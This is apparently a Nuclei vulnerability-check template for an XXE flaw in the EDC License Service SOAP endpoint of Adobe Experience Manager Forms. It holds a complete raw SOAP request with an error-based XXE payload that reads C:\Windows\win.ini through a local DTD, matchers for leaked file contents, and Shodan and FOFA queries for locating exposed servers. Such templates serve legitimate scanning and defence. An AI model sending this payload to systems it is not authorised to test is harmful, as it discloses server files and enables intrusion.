http/cves/2025/CVE-2025-54254.yaml

id: CVE-2025-54254

info:
  name: Adobe Experience Manager Forms - External Entity Injection
  author: ritikchaddha
  severity: high
  description: |
    A vulnerability in the EDC License Service SOAP endpoint allows an attacker to perform XML External Entity (XXE) injection attacks. This could lead to disclosure of sensitive information, denial of service, server-side request forgery, or other impacts.
  classification:
    cve-id: CVE-2025-54254
  metadata:
    max-request: 1
    shodan-query: http.component:"Adobe Experience Manager"
    fofa-query: title="aem sign in"
  tags: cve,cve2025,xxe,edc,soap

http:
  - raw:
      - |
        POST /edcws/services/urn:EDCLicenseService HTTP/1.1
        Host: {{Hostname}}
        SOAPAction:
        Content-Type: text/xml;charset=UTF-8

        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns1="http://adobe.com/edcwebservice" xmlns:impl="http://localhost:8080/axis/services/urn:EDCLicenseService" xmlns:ns2="http://core.adobe.com" xmlns:ns1="http://ns.adobe.com/PolicyServer/ws"><SOAP-ENV:Header><EDCSecurity><@html_entities>
        <!DOCTYPE doc [
              <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
              <!ENTITY % SuperClass '>
                  <!ENTITY &#x25; file SYSTEM "C:\Windows\win.ini">
                  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;file;qqq://x&#x27;>">
                  &#x25;eval;
                  &#x25;error;
                <!ENTITY test "test"'>
              %local_dtd;
            ]><xxx>anything</xxx>
        </@html_entities></EDCSecurity><Version>7</Version><Locale>de-de</Locale></SOAP-ENV:Header><SOAP-ENV:Body><impl:synchronize><SynchronizationRequest><firstTime>1</firstTime><licenseSeqNum>0</licenseSeqNum><policySeqNum>1</policySeqNum><revocationSeqNum>0</revocationSeqNum><watermarkTemplateSeqNum>0</watermarkTemplateSeqNum></SynchronizationRequest></impl:synchronize></SOAP-ENV:Body></SOAP-ENV:Envelope>

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "regex('root:.*:0:0:', body)"
          - "contains(content_type, 'text/xml')"
          - "status_code == 500"
        condition: and

      - type: dsl
        dsl:
          - "contains_all(body, 'no protocol:', '[extensions]', '[fonts]')"
          - "contains(content_type, 'text/xml')"
          - "status_code == 500"
        condition: and
